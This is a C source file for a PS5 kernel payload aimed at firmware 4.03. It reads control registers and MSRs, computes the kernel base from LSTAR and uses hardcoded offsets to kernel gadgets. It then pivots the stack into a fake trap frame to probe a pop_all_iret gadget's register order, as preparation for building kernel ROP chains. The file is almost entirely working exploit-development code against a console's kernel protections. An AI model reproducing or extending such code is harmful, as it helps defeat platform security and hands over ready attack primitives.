#include <stdint.h>

/*
 * PS5 Chain Preparation (kstuff payload)
 *
 * Two sequential tests:
 *
 * Test 1 (safe): Read system registers needed for ROP chain design
 *   EFER, CR0, CR4, CS, SS, RFLAGS
 *
 * Test 2 (may crash if layout wrong): Probe pop_all_iret
 *   Builds a fake trap frame with 15 unique marker values,
 *   4 skip qwords, and an iret frame pointing to our capture stub.
 *   Jumps to pop_all_iret which pops 15 registers, skips 0x20 bytes
 *   (trapno/addr/flags/err), then does iretq back to our code.
 *   We capture which markers landed in which registers, confirming
 *   the exact pop order for ROP chain register setup.
 *
 * If Test 2 crashes, the pop_all_iret layout doesn't match FreeBSD's
 * standard. Adjust SKIP_BYTES and retest.
 *
 * Output layout (uint64_t indices for readback):
 *   [0]  magic(32) "CPRP" | overall_status(32)
 *   [1]  kdata_base
 *   [2]  ktext_base
 *   [3]  efer
 *   [4]  cr0
 *   [5]  cr4
 *   [6]  cs(16) | ss(16) | rflags_low(32)
 *   [7]  rflags (full 64-bit)
 *   [8]  test1_status(32) | test2_status(32)
 *   [9]  pop_all_iret_addr (for verification)
 *   [10..24] captured registers (15): rdi,rsi,rdx,rcx,r8,r9,
 *            rax,rbx,rbp,r10,r11,r12,r13,r14,r15
 *
 * Total: 200 bytes (fits in 512-byte readback)
 */

#define MAGIC_CPRP       0x43505250  /* "CPRP" */
#define STATUS_NONE      0x0000
#define STATUS_TRYING    0xAAAA
#define STATUS_PASS      0x0001

/* FW 4.03 offsets (from kdata_base, negative = ktext) */
#define OFF_WRMSR_RET     (-0x9d20cc)
#define OFF_NOP_RET       (OFF_WRMSR_RET + 2)
#define OFF_POP_ALL_IRET  (-0x9cf8ab)

/*
 * Number of bytes between last pop (r15) and the iret frame.
 * Standard FreeBSD: add rsp, 0x20 → skips 4 qwords (32 bytes).
 * If pop_all_iret crashes, try changing this value.
 */
#define SKIP_BYTES  0x20

typedef struct {
    uint64_t kdata_base;
    uint32_t fw_ver;
} kproc_args;

typedef struct __attribute__((packed)) {
    uint32_t magic;
    uint32_t overall_status;
    uint64_t kdata_base;
    uint64_t ktext_base;
    uint64_t efer;
    uint64_t cr0;
    uint64_t cr4;
    uint16_t cs;
    uint16_t ss;
    uint32_t rflags_low;
    uint64_t rflags;
    uint32_t test1_status;
    uint32_t test2_status;
    uint64_t pop_all_iret_addr;
    uint64_t cap[15]; /* captured register values */
} chain_prep_result_t;

static inline uint64_t rdmsr_read(uint32_t msr)
{
    uint32_t lo, hi;
    __asm__ volatile("rdmsr" : "=a"(lo), "=d"(hi) : "c"(msr));
    return ((uint64_t)hi << 32) | lo;
}

static inline uint64_t read_cr0(void)
{
    uint64_t v;
    __asm__ volatile("mov %%cr0, %0" : "=r"(v));
    return v;
}

static inline uint64_t read_cr4(void)
{
    uint64_t v;
    __asm__ volatile("mov %%cr4, %0" : "=r"(v));
    return v;
}

/* ── Probe data (in .bss) ── */
static volatile uint64_t captured_regs[15];
static volatile uint64_t saved_rsp;
static volatile uint64_t resume_target;

/*
 * capture_stub: iretq landing pad
 *
 * After pop_all_iret's iretq returns here, all GP registers
 * hold the marker values we loaded. We save them to captured_regs[],
 * restore RSP, and jump back to module_start's resume point.
 */
__attribute__((naked, used))
static void capture_stub(void)
{
    __asm__ volatile(
        /* Save two scratch registers */
        "pushq %%rax\n\t"
        "pushq %%rbx\n\t"

        "leaq captured_regs(%%rip), %%rax\n\t"

        /* Save registers loaded by pop_all_iret */
        "movq %%rdi, 0*8(%%rax)\n\t"
        "movq %%rsi, 1*8(%%rax)\n\t"
        "movq %%rdx, 2*8(%%rax)\n\t"
        "movq %%rcx, 3*8(%%rax)\n\t"
        "movq %%r8,  4*8(%%rax)\n\t"
        "movq %%r9,  5*8(%%rax)\n\t"

        /* Recover original RAX (pushed first, deeper on stack) */
        "movq 8(%%rsp), %%rbx\n\t"
        "movq %%rbx, 6*8(%%rax)\n\t"

        /* Recover original RBX (pushed second, top of stack) */
        "movq (%%rsp), %%rbx\n\t"
        "movq %%rbx, 7*8(%%rax)\n\t"

        "movq %%rbp, 8*8(%%rax)\n\t"
        "movq %%r10, 9*8(%%rax)\n\t"
        "movq %%r11, 10*8(%%rax)\n\t"
        "movq %%r12, 11*8(%%rax)\n\t"
        "movq %%r13, 12*8(%%rax)\n\t"
        "movq %%r14, 13*8(%%rax)\n\t"
        "movq %%r15, 14*8(%%rax)\n\t"

        /* Restore original RSP and jump to resume point */
        "movq saved_rsp(%%rip), %%rsp\n\t"
        "jmpq *resume_target(%%rip)\n\t"
        ::: "memory"
    );
}

int module_start(kproc_args* args)
{
    uint64_t kdata_base = args->kdata_base;
    uint64_t lstar = rdmsr_read(0xC0000082);
    uint64_t ktext_base = lstar - 0x294218;

    uint64_t pop_all_iret_addr = kdata_base + OFF_POP_ALL_IRET;

    chain_prep_result_t* out = (chain_prep_result_t*)args;
    out->magic = MAGIC_CPRP;
    out->overall_status = 0;
    out->kdata_base = kdata_base;
    out->ktext_base = ktext_base;
    out->test1_status = STATUS_NONE;
    out->test2_status = STATUS_NONE;
    out->pop_all_iret_addr = pop_all_iret_addr;

    /* Zero captured registers */
    for (int i = 0; i < 15; i++)
        out->cap[i] = 0;

    /* ════════════════════════════════════════════
     * TEST 1: Read system registers
     * ════════════════════════════════════════════ */
    out->test1_status = STATUS_TRYING;

    out->efer = rdmsr_read(0xC0000080);
    out->cr0 = read_cr0();
    out->cr4 = read_cr4();

    uint16_t cs_val, ss_val;
    __asm__ volatile("movw %%cs, %0" : "=r"(cs_val));
    __asm__ volatile("movw %%ss, %0" : "=r"(ss_val));
    out->cs = cs_val;
    out->ss = ss_val;

    uint64_t rflags;
    __asm__ volatile("pushfq; popq %0" : "=r"(rflags));
    out->rflags = rflags;
    out->rflags_low = (uint32_t)rflags;

    out->test1_status = STATUS_PASS;
    out->overall_status = 1;

    /* ════════════════════════════════════════════
     * TEST 2: Probe pop_all_iret register layout
     *
     * Expected FreeBSD amd64 pop order:
     *   pop rdi, rsi, rdx, rcx, r8, r9, rax, rbx,
     *       rbp, r10, r11, r12, r13, r14, r15
     *   add rsp, SKIP_BYTES
     *   [conditional swapgs - skipped for kernel CS]
     *   iretq
     *
     * We provide 15 unique markers (0xD1..01 through 0xDF..0F)
     * for the pops, skip padding, then an iret frame.
     *
     * After iretq → capture_stub saves register values.
     * We compare captured values to markers to verify the order.
     * ════════════════════════════════════════════ */
    out->test2_status = STATUS_TRYING;

    /* Build test stack at offset 0x800 in 4KB args buffer */
    uint64_t* stk = (uint64_t*)((uint8_t*)args + 0x800);
    int s = 0;

    /* First entry: retq pops this → jumps to pop_all_iret */
    stk[s++] = pop_all_iret_addr;

    /* 15 marker values for the 15 pops */
    stk[s++] = 0xD100000000000001ULL;  /* pop 0: expect RDI */
    stk[s++] = 0xD200000000000002ULL;  /* pop 1: expect RSI */
    stk[s++] = 0xD300000000000003ULL;  /* pop 2: expect RDX */
    stk[s++] = 0xD400000000000004ULL;  /* pop 3: expect RCX */
    stk[s++] = 0xD500000000000005ULL;  /* pop 4: expect R8  */
    stk[s++] = 0xD600000000000006ULL;  /* pop 5: expect R9  */
    stk[s++] = 0xD700000000000007ULL;  /* pop 6: expect RAX */
    stk[s++] = 0xD800000000000008ULL;  /* pop 7: expect RBX */
    stk[s++] = 0xD900000000000009ULL;  /* pop 8: expect RBP */
    stk[s++] = 0xDA0000000000000AULL;  /* pop 9: expect R10 */
    stk[s++] = 0xDB0000000000000BULL;  /* pop 10: expect R11 */
    stk[s++] = 0xDC0000000000000CULL;  /* pop 11: expect R12 */
    stk[s++] = 0xDD0000000000000DULL;  /* pop 12: expect R13 */
    stk[s++] = 0xDE0000000000000EULL;  /* pop 13: expect R14 */
    stk[s++] = 0xDF0000000000000FULL;  /* pop 14: expect R15 */

    /* SKIP_BYTES / 8 qwords skipped by add rsp, SKIP_BYTES */
    int skip_qwords = SKIP_BYTES / 8;
    for (int i = 0; i < skip_qwords; i++)
        stk[s++] = 0xEE00000000000010ULL + i; /* distinguishable skip markers */

    /* iret frame: RIP, CS, RFLAGS, RSP, SS */
    stk[s++] = (uint64_t)capture_stub;         /* RIP after iretq */
    stk[s++] = (uint64_t)cs_val;               /* CS (kernel) */
    stk[s++] = rflags & ~0x100ULL;             /* RFLAGS (clear TF) */
    stk[s++] = (uint64_t)((uint8_t*)args + 0xF00); /* RSP after iretq */
    stk[s++] = (uint64_t)ss_val;               /* SS (kernel) */

    /* Execute the chain */
    __asm__ volatile(
        /* Save resume address for capture_stub to jump to */
        "leaq 1f(%%rip), %%rax\n\t"
        "movq %%rax, resume_target(%%rip)\n\t"

        /* Save RSP for capture_stub to restore */
        "movq %%rsp, saved_rsp(%%rip)\n\t"

        /* Pivot RSP to our test stack */
        "movq %[chain], %%rsp\n\t"

        /* Start: ret pops pop_all_iret_addr → pops begin */
        "retq\n\t"

        /* Resume point: capture_stub jumps here after saving regs */
        "1:\n\t"
        :
        : [chain] "r"(stk)
        : "rax", "memory", "cc"
    );

    /* If we reach here, the full chain worked */
    out->test2_status = STATUS_PASS;
    out->overall_status = 2;

    /* Copy captured register values to output */
    for (int i = 0; i < 15; i++)
        out->cap[i] = captured_regs[i];

    return 0;
}
